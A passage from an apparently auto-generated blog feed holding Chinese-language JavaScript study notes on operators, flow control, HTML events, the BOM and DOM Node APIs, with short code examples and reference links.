title="运算符"></a>运算符</h3><p>算术运算符：（注意：不要直接判断浮点数是否相等）</p><p>递增递减运算符：</p><p>比较运算符：</p><p>逻辑运算符：（注意一下<strong>逻辑与短路运算</strong>，<strong>逻辑或短路运算</strong>）</p><p>赋值运算符：</p><p>运算符优先级：</p><h3 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h3><ul><li><p>顺序结构</p></li><li><p>分支结构;</p></li></ul><ol><li><p>if语句</p><p>2.if-else</p></li></ol><p>​    3.三元表达式</p><p>​    4.switch(break)</p><p><strong>注意</strong>：<code>switch</code>语句后面的表达式，与<code>case</code>语句后面的表示式比较运行结果时，采用的是严格相等运算符（<code>===</code>），而不是相等运算符（<code>==</code>），这意味着比较时不会发生类型转换。</p><ul><li>循环结构：</li></ul><p>​      1.while循环</p><p>​      2.for循环</p><p>​      3.do…while循环</p><ul><li>跳转手段</li></ul><p>​      1.break语句</p><p>​     2.continue语句</p><p>​      3.标签</p><pre><code>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">top:</span><br><span class="line">  for (var i = 0; i &lt; 3; i++)&#123;</span><br><span class="line">    for (var j = 0; j &lt; 3; j++)&#123;</span><br><span class="line">      if (i === 1 &amp;&amp; j === 1) break top;</span><br><span class="line">      console.log(&#x27;i=&#x27; + i + &#x27;, j=&#x27; + j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;  //跳出双重循环</span><br><span class="line">  </span><br><span class="line">  foo: &#123;</span><br><span class="line">  console.log(1);</span><br><span class="line">  break foo;</span><br><span class="line">  console.log(&#x27;本行不会输出&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(2);    //跳出区块</span><br><span class="line"></span><br><span class="line">top:</span><br><span class="line">  for (var i = 0; i &lt; 3; i++)&#123;</span><br><span class="line">    for (var j = 0; j &lt; 3; j++)&#123;</span><br><span class="line">      if (i === 1 &amp;&amp; j === 1) continue top;</span><br><span class="line">      console.log(&#x27;i=&#x27; + i + &#x27;, j=&#x27; + j);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;          //进入下一层外层循环</span><br></pre></td></tr></table></figure></code></pre><h2 id="JavaScript对象"><a href="#JavaScript对象" class="headerlink" title="JavaScript对象"></a>JavaScript对象</h2><h2 id="JavaScript事件"><a href="#JavaScript事件" class="headerlink" title="JavaScript事件"></a>JavaScript事件</h2><p>HTML 事件是发生在 HTML 元素上的事情。当在 HTML 页面中使用 JavaScript 时， JavaScript 可以触发这些事件。例如页面加载完成、你点击个按钮、文本框输入了文字等等，都是HTML事件的案例。</p><table><thead><tr><th>事件</th><th>描述</th></tr></thead><tbody><tr><td>onchange</td><td>HTML元素改变</td></tr><tr><td>onclick</td><td>用户点击HTML元素</td></tr><tr><td>onmouseover</td><td>用户在一个HTML元素上移动鼠标</td></tr><tr><td>onmouseout</td><td>用户在一个HTML元素上移开鼠标</td></tr><tr><td>onkeydown</td><td>用户按下键盘按键</td></tr><tr><td>onload</td><td>浏览器已完成页面的加载</td></tr><tr><td>onfocus</td><td>元素获取焦点是触发</td></tr><tr><td>onblur</td><td>元素失去焦点时触发</td></tr></tbody></table><h2 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h2><p>Window 对象表示浏览器中打开的窗口。</p><p><strong>Window对象</strong></p><table><thead><tr><th>属性</th><th>描述</th></tr></thead><tbody><tr><td>document</td><td>对 Document 对象的只读引用</td></tr><tr><td>history</td><td>对 History 对象的只读引用</td></tr><tr><td>location</td><td>用于窗口或框架的 Location 对象</td></tr><tr><td>name</td><td>设置或返回窗口的名称</td></tr></tbody></table><p><strong>history:</strong></p><ul><li>history.back() - 与在浏览器点击后退按钮相同</li><li>history.forward() - 与在浏览器中点击向前按钮相同</li><li>history.go(1/-1)<br>参数为1:等同于 history.forward()，<br>参数为-1，等同于 history.back()</li></ul><p><strong>location</strong>:(用于获得当前页面的地址 (URL)，并把浏览器重定向到新的页面，window.location 对象在编写时可不使用 window 这个前缀)</p><ul><li>replace(url) 转向到url网页地址</li><li>reload() 重新载入当前网址，如同按下刷新按钮</li><li>window.location.href：获取当前窗口正在浏览的网页地址</li></ul><p><strong>Window对象方法</strong></p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>alert()</td><td>显示带有一段消息和一个确认按钮的警告框</td></tr><tr><td>confirm()</td><td>显示带有一段消息以及确认按钮和取消按钮的对话框</td></tr><tr><td>prompt()</td><td>弹出的对话框，提示文字的下方，还有一个输入框，要求用户输入信息，并有“确定”和“取消”两个按钮。它往往用来获取用户输入的数据</td></tr><tr><td>open()</td><td>用于新建另一个浏览器窗口，类似于浏览器菜单的新建窗口选项</td></tr><tr><td>close()</td><td>用于关闭当前窗口</td></tr><tr><td>setTimeout()</td><td></td></tr><tr><td>setInterval()</td><td></td></tr><tr><td>clearInterval()</td><td>取消由 setInterval() 设置的 timeout</td></tr><tr><td>clearTimeout()</td><td>取消由 setTimeout() 方法设置的 timeout</td></tr></tbody></table><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>（Document 对象是 Window 对象的一部分，可通过 window.document 属性对其进行访问。）</p><p>当浏览器载入 HTML 文档, 它就会成为 <strong>Document 对象</strong>，Document 对象是 HTML 文档的根节点，Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。</p><p>节点的类型有七种。</p><ul><li><code>Document</code>：整个文档树的顶层节点</li><li><code>DocumentType</code>：<code>doctype</code>标签（比如<code>&lt;!DOCTYPE html&gt;</code>）</li><li><code>Element</code>：网页的各种HTML标签（比如<code>&lt;body&gt;</code>、<code>&lt;a&gt;</code>等）</li><li><code>Attr</code>：网页元素的属性（比如<code>class=&quot;right&quot;</code>）</li><li><code>Text</code>：标签之间或标签包含的文本</li><li><code>Comment</code>：注释</li><li><code>DocumentFragment</code>：文档的片段</li></ul><p><img src="/C:/Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20210929180551744.png" alt="image-20210929180551744"></p><h3 id="Node"><a href="#Node" class="headerlink" title="Node"></a>Node</h3><p>DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。</p><table><thead><tr><th>属性/方法</th><th>用法</th></tr></thead><tbody><tr><td>Node.prototype.nodeType</td><td>返回一个整数值，表示节点的类型。</td></tr><tr><td>Node.prototype.nodeName</td><td>返回节点的名称</td></tr><tr><td>Node.prototype.nodeValue</td><td>返回一个字符串，表示当前节点本身的文本值，该属性可读写。</td></tr><tr><td>Node.prototype.textContent</td><td>返回当前节点和它的所有后代节点的文本内容</td></tr><tr><td>Node.prototype.baseURI</td><td>返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。</td></tr><tr><td>Node.prototype.ownerDocument</td><td>返回当前节点所在的顶层文档对象，即<code>document</code>对象。</td></tr><tr><td>Node.prototype.nextSibling</td><td>返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回<code>null</code>。可以用来遍历所有子节点。</td></tr><tr><td>Node.prototype.previousSibling</td><td>返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回<code>null</code>。</td></tr><tr><td>Node.prototype.parentNode</td><td>返回当前节点的父节点。对于一个节点来说，它的父节点只可能是三种类型：元素节点、文档节点和文档片段节点</td></tr><tr><td>Node.prototype.parentElement</td><td>返回当前节点的父元素节点。如果当前节点没有父节点，或者父节点类型不是元素节点，则返回<code>null</code>。</td></tr><tr><td>Node.prototype.firstChild</td><td>返回当前节点的第一个子节点，如果当前节点没有子节点，则返回<code>null</code>。</td></tr><tr><td>Node.prototype.lastChild</td><td>返回当前节点的最后一个子节点，如果当前节点没有子节点，则返回<code>null</code>。</td></tr><tr><td>Node.prototype.childNodes</td><td>返回一个类似数组的对象（<code>NodeList</code>集合），成员包括当前节点的所有子节点。</td></tr><tr><td>Node.prototype.isConnected</td><td>返回一个布尔值，表示当前节点是否在文档之中</td></tr><tr><td>Node.prototype.appendChild()</td><td>接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。该方法的返回值就是插入文档的子节点。如果参数节点是 DOM 已经存在的节点，<code>appendChild()</code>方法会将其从原来的位置，移动到新位置。</td></tr><tr><td>Node.prototype.hasChildNodes()</td><td>返回一个布尔值，表示当前节点是否有子节点。</td></tr><tr><td>Node.prototype.cloneNode()</td><td>用于克隆一个节点。它接受一个布尔值作为参数，表示是否同时克隆子节点。它的返回值是一个克隆出来的新节点。</td></tr><tr><td>Node.prototype.insertBefore()</td><td>用于将某个节点插入父节点内部的指定位置。第一个参数是所要插入的节点<code>newNode</code>，第二个参数是父节点<code>parentNode</code>内部的一个子节点<code>referenceNode</code>。<code>newNode</code>将插在<code>referenceNode</code>这个子节点的前面。</td></tr><tr><td>Node.prototype.removeChild()</td><td>接受一个子节点作为参数，用于从当前节点移除该子节点。返回值是移除的子节点。</td></tr><tr><td>Node.prototype.replaceChild()</td><td>用于将一个新的节点，替换当前节点的某一个子节点。第一个参数<code>newChild</code>是用来替换的新节点，第二个参数<code>oldChild</code>是将要替换走的子节点。返回值是替换走的那个节点<code>oldChild</code>。</td></tr><tr><td>Node.prototype.compareDocumentPosition()</td><td>返回一个六个比特位的二进制值，表示参数节点与当前节点的关系。</td></tr><tr><td>Node.prototype.contains()</td><td>返回一个布尔值，表示参数节点是否满足以下三个条件之一。参数节点为当前节点，参数节点为当前节点的子节点，参数节点为当前节点的后代节点。</td></tr><tr><td>Node.prototype.isEqualNode()</td><td>返回一个布尔值，用于检查两个节点是否相等。所谓相等的节点，指的是两个节点的类型相同、属性相同、子节点相同。</td></tr><tr><td>Node.prototype.isSameNode()</td><td>返回一个布尔值，表示两个节点是否为同一个节点。</td></tr><tr><td>Node.prototype.normalize()</td><td>用于清理当前节点内部的所有文本节点（text）。它会去除空的文本节点，并且将毗邻的文本节点合并成一个，也就是说不存在空的文本节点，以及毗邻的文本节点。</td></tr><tr><td>Node.prototype.getRootNode()</td><td>返回当前节点所在文档的根节点<code>document</code>，与<code>ownerDocument</code>属性的作用相同。</td></tr></tbody></table><h3 id="NodeList-HTMLCollection"><a href="#NodeList-HTMLCollection" class="headerlink" title="NodeList,HTMLCollection"></a>NodeList,HTMLCollection</h3><h3 id="ParentNode-ChildNode"><a href="#ParentNode-ChildNode" class="headerlink" title="ParentNode,ChildNode"></a>ParentNode,ChildNode</h3><h3 id="查找HTML元素方法"><a href="#查找HTML元素方法" class="headerlink" title="查找HTML元素方法"></a>查找HTML元素方法</h3><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>document.getElementById()</td><td>返回对拥有指定 id 的第一个对象的引用。</td></tr><tr><td>document.getElementsByClassName()</td><td>返回文档中所有指定类名的元素集合，作为 NodeList 对象</td></tr><tr><td>document.getElementsByTagName()</td><td>返回带有指定标签名的对象集合</td></tr><tr><td>document.getElementsByName()</td><td>返回带有指定名称的对象集合</td></tr></tbody></table><h3 id="查看属性"><a href="#查看属性" class="headerlink" title="查看属性"></a>查看属性</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(h1.getAttribute(&quot;class&quot;))</span><br></pre></td></tr></table></figure><h3 id="修改HTML内容和属性"><a href="#修改HTML内容和属性" class="headerlink" title="修改HTML内容和属性"></a>修改HTML内容和属性</h3><p>修改内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(id).innerHTML= HTML;</span><br><span class="line">document.getElementById(&quot;myimg&quot;).src=&quot;x1.jpg&quot;;</span><br></pre></td></tr></table></figure><p>修改属性：</p><p>1.HTML属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方式1:</span><br><span class="line">document.getElementById(id).attribute=新属性值;</span><br><span class="line"></span><br><span class="line">方式2:</span><br><span class="line">document.getElementById(id).setAttribute(属性名，属性值);</span><br></pre></td></tr></table></figure><p>修改CSS：</p><p>语法:<br>document.getElementById(id).style.property=新样式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">document.getElementById(&quot;myli&quot;).style.color=&quot;blue&quot;; </span><br><span class="line">document.getElementById(&quot;myli&quot;).style.fontFamily=&quot;微软雅黑&quot;; </span><br><span class="line">document.getElementById(&quot;myli&quot;).style.fontSize=&quot;24px&quot;;</span><br></pre></td></tr></table></figure><h3 id="创建新的HTML元素"><a href="#创建新的HTML元素" class="headerlink" title="创建新的HTML元素"></a>创建新的HTML元素</h3><h3 id="替换HTML元素"><a href="#替换HTML元素" class="headerlink" title="替换HTML元素"></a>替换HTML元素</h3><h3 id="删除HTML元素"><a href="#删除HTML元素" class="headerlink" title="删除HTML元素"></a>删除HTML元素</h3><h2 id="表单验证"><a href="#表单验证" class="headerlink" title="表单验证"></a>表单验证</h2><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><h3 id="1-关于call-函数的应用："><a href="#1-关于call-函数的应用：" class="headerlink" title="1.关于call()函数的应用："></a>1.关于call()函数的应用：</h3><p>用于绑定this；如果出现了函数被覆盖的情况下，可以使用call实现原生函数调用。</p><h3 id="2-将类似数组的对象转为真正的数组："><a href="#2-将类似数组的对象转为真正的数组：" class="headerlink" title="2.将类似数组的对象转为真正的数组："></a>2.将类似数组的对象转为真正的数组：</h3><p>1.使用call（）；</p><p>2.<code>slice()</code>方法；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Array.prototype.slice.call(&#123; 0: &#x27;a&#x27;, 1: &#x27;b&#x27;, length: 2 &#125;)</span><br><span class="line">// [&#x27;a&#x27;, &#x27;b&#x27;]</span><br><span class="line"></span><br><span class="line">Array.prototype.slice.call(document.querySelectorAll(&quot;div&quot;));</span><br><span class="line">Array.prototype.slice.call(arguments);</span><br></pre></td></tr></table></figure><h3 id="3-进制转换"><a href="#3-进制转换" class="headerlink" title="3.进制转换"></a>3.进制转换</h3><p>十进制转其他进制：tostring()</p><p>其他进制转十进制：parseInt()</p><h3 id="4-插入文本"><a href="#4-插入文本" class="headerlink" title="4.插入文本"></a>4.插入文本</h3><p>1.使用createTextNode添加文本节点</p><p>2.修改textContent属性值</p><p>参考资料：</p><p><a href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a></p><p><a href="https://www.runoob.com/js/js-tutorial.html">JavaScript 教程 | 菜鸟教程 (runoob.com)</a></p><p><a href="https://blog.csdn.net/m0_55221239/article/details/115313923">(8条消息) Web前端：JavaScript最强总结 附详细代码 （带常用案例！）_BudingCode的博客-CSDN博客_web前端案例代码</a></p><p><a href="https://movie.blog.csdn.net/article/details/82817457">(8条消息) JavaScript学习笔记（三）Js正则、DOM_一叶知秋-CSDN博客</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript#%E6%95%99%E7%A8%8B">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript#%E6%95%99%E7%A8%8B</a></p><p><a href="https://zh.javascript.info/">https://zh.javascript.info/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JavaScript学习笔记&quot;&gt;&lt;a href=&quot;#JavaScript学习笔记&quot; class=&quot;headerlink&quot; title=&quot;JavaScript学习笔记&quot;&gt;&lt;/a&gt;JavaScript学习笔记&lt;/h1&gt;&lt;h2 id=&quot;基本语法&quot;&gt;&lt;a href=&quot;#基</summary>
      
    
    
    
    
  </entry>
  
</feed>
